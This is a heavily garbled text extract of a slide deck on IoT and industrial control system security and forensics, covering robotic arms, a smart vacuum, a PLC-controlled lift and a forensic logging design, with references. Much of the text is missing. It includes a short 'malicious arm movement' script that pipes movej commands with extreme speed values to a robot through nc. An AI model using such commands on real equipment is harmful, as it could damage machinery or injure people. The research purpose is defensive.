IOT 
  SM Yiu, Raymond Chan, CF Chan, Ken Yau

 2014

2014 ISC

CLICK TO ADD SUBHEADING
Inner text Typeface: Arial 14

Typeface: Arial 20

2018 ­ ? 

?
Inner text Typeface: Arial 14


1. IOT? 2. ? ()
6



Typeface: Arial 14
?



?


Wi-Fi Router

Smart Vacuum cleaner

Smartphone

Smart Vacuum cleaner Network trace

 

! 


· Script of the malicious arm movement · Logs



Robotic Arm Logs
· 
· 3.5 :: 0002d05h20m22.919s :: 2018-08-29 13:35:13.919 :: -5 :: C0A0:7 :: null :: 1 :: :: Program forkprotected starting... (Last saved: 2018-08-27 19:40:43) :: null · 3.5 :: 0002d06h27m21.104s :: 2018-08-29 13:35:23.104 :: -3 :: C0A0:7 :: null :: 1 :: forkprotected :: Program forkprotected started :: null · 3.5 :: 0002d07h00m53.136s :: 2018-08-29 14:08:55.136 :: -3 :: C0A0:7 :: null :: 1 :: forkprotected :: Program forkprotected stopped :: null · 3.5 :: 0002d09h37m58.671s :: 2018-08-29 17:52:48.671 :: -5 :: C0A0:7 :: null :: 1 :: :: Program forkprotected starting... (Last saved: 2018-08-27 19:40:43) :: null · 3.5 :: 0002d09h38m06.591s :: 2018-08-29 17:52:56.591 :: -5 :: C0A0:7 :: null :: 1 :: :: Program forkprotected starting... (Last saved: 2018-08-27 19:40:43) :: null · 3.5 :: 0002d10h44m56.832s :: 2018-08-29 17:52:58.832 :: -3 :: C0A0:7 :: null :: 1 :: forkprotected :: Program forkprotected started :: null · 3.5 :: 0002d10h47m27.216s :: 2018-08-29 17:55:29.216 :: -3 :: C0A0:7 :: null :: 1 :: forkprotected :: Program forkprotected paused :: null
· 
· echo 'movej([-1.5743878523456019, 0.0984121561050415, -1.054539982472555, -2.1616690794574183, 1.530264973640442, 0.9618288278579712], a=3.141592653589793, v=3.141592653589793)' | nc xxxx yyyy
· echo 'movej([-3.123030487691061, -2.620304886494772, -0.5577314535724085, -1.4209883848773401, 3.139153782521383, 0.9618288278579712], a=3.141592653589793, v=3.141592653589793)' | nc xxxx yyyy
· echo 'movej([0.04313834384083748, -2.656261746083395, -0.5591471830951136, -1.4209168593036097, 3.139153782521383, 0.9618288278579712], a=350.141592653589793, v=4000.141592653589793)' | nc nc xxxx yyyy
?


Workstation Switch / Router
PLC

Robotic Arm


· Logs
· 3.5 :: 0002d06h16m57.904s :: 2018-08-29 13:26:49.904 :: -3 :: C0A0:7 :: null :: 1 :: movej :: Program movej started :: null · 3.5 :: 0002d06h17m00.984s :: 2018-08-29 13:26:52.984 :: -3 :: C0A0:7 :: null :: 1 :: movej :: Program movej stopped :: null · 3.5 :: 0002d06h17m02.016s :: 2018-08-29 13:26:53.016 :: -3 :: C0A0:7 :: null :: 1 :: movej :: Program movej started :: null · 3.5 :: 0002d06h17m04.600s :: 2018-08-29 13:26:56.600 :: -3 :: C0A0:7 :: null :: 1 :: movej :: Program movej stopped :: null · 3.5 :: 0002d06h17m06.120s :: 2018-08-29 13:26:57.120 :: -3 :: C0A0:7 :: null :: 1 :: movej :: Program movej started :: null · 3.5 :: 0002d06h17m07.440s :: 2018-08-29 13:26:59.440 :: -3 :: C0A0:7 :: null :: 1 :: movej :: Program movej stopped :: null

, 
?

DoS

Stop-in-the-middle

""


PLC to control the lift

Touch panel for floor selection

HMI 


·  
23


24

PLC 

 PLC


PC with TIA HMI
Switch PLC



PLC
· TIA · 
 · 
 

PLC
Every program block has their own set of timestamps

PLC

· PLC TIA  
· id 
· PLC  



PLC

PC with TIA
 HMI
Switch

PLC PLC 

 

-  For detection and investigation.

33

CISC



· PLC scan cycle

·  · I/O, 
­  ­ 
Process logic
monitor

Forensic block

TCP or other communication channel

Historian

 POC

FC: Block_1   

FC: check_io_changed  1) 2) 3)
FC: Block_2  tcp


· PLC ·  · 


·  ·  ·  · 
Output (00101...) Car red (0), Car yellow (0), car green (1), Pedestrian red (0), Pedestrian green (1)


·  ·  · 
·  · 


· 
· 
· 
· 
· 
· TIA Step7
· 


· CHAN C.F., Chow K.P., Yiu S.M. and K. Yau, Enhancing Forensic and Abnormality Detection Capabilities for Programmable Logic Controllers, The Fourteenth IFIP WG 11.9 International Conference on Digital Forensics, 2018
· K. Yau, Chow K.P. and Yiu S.M., Effective Logging System for Digital Forensic Readiness of Siemens Programmable Logic Controllers, The Fourteenth IFIP WG 11.9 International Conference on Digital Forensics, 2018
· YAU K.K. and Chow K.P., Applying Machine Learning to PLC Event Detection and Logging for Forensic Purpose, The Thirteenth IFIP WG 11.9 International Conference on Digital Forensics, 2017
· S.M. YIU, Cyber Security Research on Industrial Control Systems (Invited talk), Cyber-security for industry 4.0 conference, 23 June, 2017, Hong Kong
· S.M. YIU, (PLC)  (Invited talk), XDef 2017, Nov 2017, Wuhan, China
· CHAN C.B. and Chow K.P., Industrial Control System Internal Network Threat Analysis: A Study of the Siemens PLC-Controlled Elevator System, Eleventh Annual IFIP Working Group 11.10 International Conference on Critical Infrastructure Protection, 2017
· CHAN C.B. and Chow K.P., Forensic Analysis of a Siemens Programmable Logic Controller, Tenth Annual IFIP Working Group 11.10 International Conference on Critical Infrastructure Protection, 2016

 
chow@cs.hku.hk

